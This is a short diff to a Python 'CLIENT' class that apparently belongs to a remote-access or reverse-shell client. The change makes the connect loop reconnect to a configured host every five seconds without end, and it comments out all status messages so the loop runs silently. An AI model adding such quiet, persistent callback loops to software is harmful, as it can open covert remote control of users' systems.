@@ -143,20 +143,31 @@ class CLIENT:
                 print("[!] Keyboard interrupt received, closing connection.")
                 break
 
-
     def engage(self):
-        self.SOCK = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        
         while True:
             try:
-                # print("Connecting To: %s:%d" % (self.ipaddress, self.port))
+                # print(f"[+] Connecting to {self.ipaddress}:{self.port} ...")
+                self.SOCK = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 self.SOCK.connect((self.ipaddress, self.port))
-                self.acceptor()
+                # print("[OK] Connected successfully!")
+
+
+
+                try:
+                    self.acceptor() 
+                except Exception as e:
+                    # print(f"[!] Connection lost during session: {e}")
+                    self.SOCK.close()
+                    time.sleep(5)
+                    continue
+
             except ConnectionRefusedError:
-                print("[!] Connection refused, retrying in 5 seconds...")
+                # print("[!] Connection refused, retrying in 5 seconds...")
                 time.sleep(5)
                 continue
             except Exception as e:
-                print(f"[!] Unexpected error in engage: {e}")
-                pass
+                # print(f"[!] Unexpected error in engage: {e}")
+                time.sleep(5)
+                continue
+
 
